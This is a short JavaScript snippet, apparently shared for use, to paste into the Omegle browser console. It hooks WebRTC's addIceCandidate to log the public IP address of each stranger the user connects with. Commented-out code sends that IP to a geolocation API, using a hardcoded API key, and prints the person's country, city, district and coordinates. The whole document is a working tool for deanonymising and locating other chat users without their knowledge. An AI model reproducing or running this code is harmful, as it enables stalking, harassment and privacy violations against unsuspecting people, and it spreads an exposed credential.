//paste the code on console of omegle , hit enter , hit skip button on omegle get ips of connected people


const apiKey=`21e80140de1646cba143ac30b67da4ff`;
window.oRTCPeerConnection = window.oRTCPeerConnection || window.RTCPeerConnection

window.RTCPeerConnection = function(...args) {
const pc = new window.oRTCPeerConnection(...args)

pc.oaddIceCandidate = pc.addIceCandidate

pc.addIceCandidate = function(iceCandidate, ...rest) {
const fields = iceCandidate.candidate.split(' ')

if (fields[7] === 'srflx') {
console.log('IP Address:', fields[4])
}
return pc.oaddIceCandidate(iceCandidate, ...rest)

}

return pc
}
// const ip=fields[4];

// const getLocation = async(ip) => {
//     let url = `https://api.ipgeolocation.io/ipgeo?apikey=${apiKey}&ip=${ip}`;

//     await fetch(url).then((responce) => 
//         responce.json().then((json) =>{
//             const output = `
//                 -----------------------------
//                 Country: ${json.country_name}
//                 State: ${json.state_prov}
//                 City: ${json.city}
//                 district: ${json.district}
//                 Lat / Long: (${json.latitude}, ${json.longitude})
//                 -----------------------------
//                 `;
//             console.log(output);
//         })
//     );
// };


